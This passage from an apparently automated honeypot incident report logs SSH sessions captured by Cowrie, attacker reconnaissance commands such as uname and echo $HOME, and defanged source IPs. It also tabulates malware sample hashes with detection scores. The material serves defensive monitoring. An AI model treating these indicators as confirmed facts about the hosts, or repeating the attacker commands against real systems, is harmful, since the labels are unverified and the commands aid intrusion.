| `2026-07-02 12:41:04` | `cowrie.session.params` |
| `2026-07-02 12:41:04` | `cowrie.command.input` |
| `2026-07-02 12:41:04` | `cowrie.log.closed` |
| `2026-07-02 12:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de563d6d958e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:42 |
| **Last Seen** | 2026-07-02 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:42:37` | `cowrie.session.connect` |
| `2026-07-02 12:42:37` | `cowrie.client.version` |
| `2026-07-02 12:42:37` | `cowrie.client.kex` |
| `2026-07-02 12:42:37` | `cowrie.login.success` |
| `2026-07-02 12:42:38` | `cowrie.session.params` |
| `2026-07-02 12:42:38` | `cowrie.command.input` |
| `2026-07-02 12:42:38` | `cowrie.log.closed` |
| `2026-07-02 12:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bfea2648277

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:44 |
| **Last Seen** | 2026-07-02 12:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:44:14` | `cowrie.session.connect` |
| `2026-07-02 12:44:14` | `cowrie.client.version` |
| `2026-07-02 12:44:14` | `cowrie.client.kex` |
| `2026-07-02 12:44:15` | `cowrie.login.success` |
| `2026-07-02 12:44:15` | `cowrie.session.params` |
| `2026-07-02 12:44:15` | `cowrie.command.input` |
| `2026-07-02 12:44:16` | `cowrie.log.closed` |
| `2026-07-02 12:44:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efd402c80702

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 12:45 |
| **Last Seen** | 2026-07-02 12:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:45:35` | `cowrie.session.connect` |
| `2026-07-02 12:45:35` | `cowrie.client.version` |
| `2026-07-02 12:45:35` | `cowrie.client.kex` |
| `2026-07-02 12:45:35` | `cowrie.login.success` |
| `2026-07-02 12:45:37` | `cowrie.session.params` |
| `2026-07-02 12:45:37` | `cowrie.command.input` |
| `2026-07-02 12:45:37` | `cowrie.log.closed` |
| `2026-07-02 12:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c0a5cad508

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:45 |
| **Last Seen** | 2026-07-02 12:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:45:53` | `cowrie.session.connect` |
| `2026-07-02 12:45:53` | `cowrie.client.version` |
| `2026-07-02 12:45:53` | `cowrie.client.kex` |
| `2026-07-02 12:45:53` | `cowrie.login.success` |
| `2026-07-02 12:45:54` | `cowrie.session.params` |
| `2026-07-02 12:45:54` | `cowrie.command.input` |
| `2026-07-02 12:45:55` | `cowrie.log.closed` |
| `2026-07-02 12:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b72b62355be

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 12:45 |
| **Last Seen** | 2026-07-02 12:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:45:54` | `cowrie.session.connect` |
| `2026-07-02 12:45:54` | `cowrie.client.version` |
| `2026-07-02 12:45:55` | `cowrie.client.kex` |
| `2026-07-02 12:45:55` | `cowrie.login.success` |
| `2026-07-02 12:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb2716221a2e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 12:45 |
| **Last Seen** | 2026-07-02 12:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:45:56` | `cowrie.session.connect` |
| `2026-07-02 12:45:56` | `cowrie.client.version` |
| `2026-07-02 12:45:56` | `cowrie.client.kex` |
| `2026-07-02 12:45:57` | `cowrie.login.success` |
| `2026-07-02 12:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0caae87fc7e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 12:45 |
| **Last Seen** | 2026-07-02 12:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:45:57` | `cowrie.session.connect` |
| `2026-07-02 12:45:57` | `cowrie.client.version` |
| `2026-07-02 12:45:57` | `cowrie.client.kex` |
| `2026-07-02 12:45:57` | `cowrie.login.success` |
| `2026-07-02 12:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53d849b6610a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-02 12:45 |
| **Last Seen** | 2026-07-02 12:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:45:58` | `cowrie.session.connect` |
| `2026-07-02 12:45:58` | `cowrie.client.version` |
| `2026-07-02 12:45:58` | `cowrie.client.kex` |
| `2026-07-02 12:45:58` | `cowrie.login.success` |
| `2026-07-02 12:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49e5538e64bd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:47 |
| **Last Seen** | 2026-07-02 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:47:28` | `cowrie.session.connect` |
| `2026-07-02 12:47:28` | `cowrie.client.version` |
| `2026-07-02 12:47:28` | `cowrie.client.kex` |
| `2026-07-02 12:47:28` | `cowrie.login.success` |
| `2026-07-02 12:47:29` | `cowrie.session.params` |
| `2026-07-02 12:47:29` | `cowrie.command.input` |
| `2026-07-02 12:47:29` | `cowrie.log.closed` |
| `2026-07-02 12:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3fa5b5d3467

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:49 |
| **Last Seen** | 2026-07-02 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:49:06` | `cowrie.session.connect` |
| `2026-07-02 12:49:06` | `cowrie.client.version` |
| `2026-07-02 12:49:07` | `cowrie.client.kex` |
| `2026-07-02 12:49:07` | `cowrie.login.success` |
| `2026-07-02 12:49:08` | `cowrie.session.params` |
| `2026-07-02 12:49:08` | `cowrie.command.input` |
| `2026-07-02 12:49:08` | `cowrie.log.closed` |
| `2026-07-02 12:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3586238469b8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 12:49 |
| **Last Seen** | 2026-07-02 12:49 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:49:29` | `cowrie.session.connect` |
| `2026-07-02 12:49:30` | `cowrie.client.version` |
| `2026-07-02 12:49:30` | `cowrie.client.kex` |
| `2026-07-02 12:49:37` | `cowrie.login.success` |
| `2026-07-02 12:49:41` | `cowrie.session.params` |
| `2026-07-02 12:49:41` | `cowrie.command.input` |
| `2026-07-02 12:49:42` | `cowrie.log.closed` |
| `2026-07-02 12:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1ed76622c5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:50 |
| **Last Seen** | 2026-07-02 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:50:51` | `cowrie.session.connect` |
| `2026-07-02 12:50:51` | `cowrie.client.version` |
| `2026-07-02 12:50:51` | `cowrie.client.kex` |
| `2026-07-02 12:50:51` | `cowrie.login.success` |
| `2026-07-02 12:50:52` | `cowrie.session.params` |
| `2026-07-02 12:50:52` | `cowrie.command.input` |
| `2026-07-02 12:50:52` | `cowrie.log.closed` |
| `2026-07-02 12:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71c0a4133f31

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:52 |
| **Last Seen** | 2026-07-02 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:52:35` | `cowrie.session.connect` |
| `2026-07-02 12:52:35` | `cowrie.client.version` |
| `2026-07-02 12:52:35` | `cowrie.client.kex` |
| `2026-07-02 12:52:36` | `cowrie.login.success` |
| `2026-07-02 12:52:37` | `cowrie.session.params` |
| `2026-07-02 12:52:37` | `cowrie.command.input` |
| `2026-07-02 12:52:37` | `cowrie.log.closed` |
| `2026-07-02 12:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3296bf32b8db

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:54 |
| **Last Seen** | 2026-07-02 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:54:11` | `cowrie.session.connect` |
| `2026-07-02 12:54:11` | `cowrie.client.version` |
| `2026-07-02 12:54:11` | `cowrie.client.kex` |
| `2026-07-02 12:54:11` | `cowrie.login.success` |
| `2026-07-02 12:54:12` | `cowrie.session.params` |
| `2026-07-02 12:54:12` | `cowrie.command.input` |
| `2026-07-02 12:54:12` | `cowrie.log.closed` |
| `2026-07-02 12:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b8c2ce8a5a6

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 12:54 |
| **Last Seen** | 2026-07-02 12:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:54:14` | `cowrie.session.connect` |
| `2026-07-02 12:54:14` | `cowrie.client.version` |
| `2026-07-02 12:54:14` | `cowrie.client.kex` |
| `2026-07-02 12:54:15` | `cowrie.login.success` |
| `2026-07-02 12:54:17` | `cowrie.session.params` |
| `2026-07-02 12:54:17` | `cowrie.command.input` |
| `2026-07-02 12:54:17` | `cowrie.log.closed` |
| `2026-07-02 12:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.79.0[.]187` | **60** | 2026-07-02 09:07 | 2026-07-02 09:41 | 10m | 0 | `T1592` | 🟠 MEDIUM |
| `34.14.84[.]236` | **30** | 2026-07-02 10:51 | 2026-07-02 10:52 | 1m | 0 | `T1592` | 🟠 MEDIUM |
| `34.77.145[.]211` | **30** | 2026-07-02 10:11 | 2026-07-02 10:12 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.77.179[.]1` | **30** | 2026-07-02 11:41 | 2026-07-02 11:42 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **21** | 2026-07-02 09:01 | 2026-07-02 12:54 | 16m | 0 | `T1592` | 🟠 MEDIUM |
| `159.65.233[.]253` | **3** | 2026-07-02 09:19 | 2026-07-02 10:50 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]143` | **3** | 2026-07-02 09:52 | 2026-07-02 09:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]213` | **3** | 2026-07-02 09:52 | 2026-07-02 09:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]185` | **3** | 2026-07-02 11:58 | 2026-07-02 11:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]201` | **3** | 2026-07-02 12:07 | 2026-07-02 12:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]59` | **3** | 2026-07-02 09:51 | 2026-07-02 09:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | **2** | 2026-07-02 08:59 | 2026-07-02 09:25 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]227` | **2** | 2026-07-02 12:11 | 2026-07-02 12:35 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.15[.]97` | **2** | 2026-07-02 11:55 | 2026-07-02 11:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]183` | **2** | 2026-07-02 10:47 | 2026-07-02 10:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.193[.]90` | **2** | 2026-07-02 09:21 | 2026-07-02 09:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.94.136[.]31` | 1 | 2026-07-02 12:27 | 2026-07-02 12:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `101.126.157[.]138` | 1 | 2026-07-02 09:20 | 2026-07-02 09:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.53.123[.]118` | 1 | 2026-07-02 11:49 | 2026-07-02 11:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.115[.]237` | 1 | 2026-07-02 09:35 | 2026-07-02 09:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.238[.]115` | 1 | 2026-07-02 08:55 | 2026-07-02 08:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.202.189[.]21` | 1 | 2026-07-02 10:52 | 2026-07-02 10:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.239.57[.]248` | 1 | 2026-07-02 11:59 | 2026-07-02 12:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]97` | 1 | 2026-07-02 12:37 | 2026-07-02 12:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.22.81[.]14` | 1 | 2026-07-02 11:15 | 2026-07-02 11:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]103` | 1 | 2026-07-02 10:54 | 2026-07-02 10:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]117` | 1 | 2026-07-02 10:51 | 2026-07-02 10:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]51` | 1 | 2026-07-02 10:22 | 2026-07-02 10:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.140.185[.]8` | 1 | 2026-07-02 08:57 | 2026-07-02 08:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-07-02 12:03 | 2026-07-02 12:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `27.155.120[.]131` | 1 | 2026-07-02 12:13 | 2026-07-02 12:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-07-02 10:07 | 2026-07-02 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-07-02 09:32 | 2026-07-02 09:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-07-02 12:34 | 2026-07-02 12:34 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-02 11:33 | 2026-07-02 11:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-02 09:31 | 2026-07-02 09:32 | 49s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]190` | 1 | 2026-07-02 10:31 | 2026-07-02 10:31 | 25s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-02 11:26 | 2026-07-02 11:26 | 2s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]17` | 1 | 2026-07-02 09:53 | 2026-07-02 09:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]57` | 1 | 2026-07-02 09:37 | 2026-07-02 09:37 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
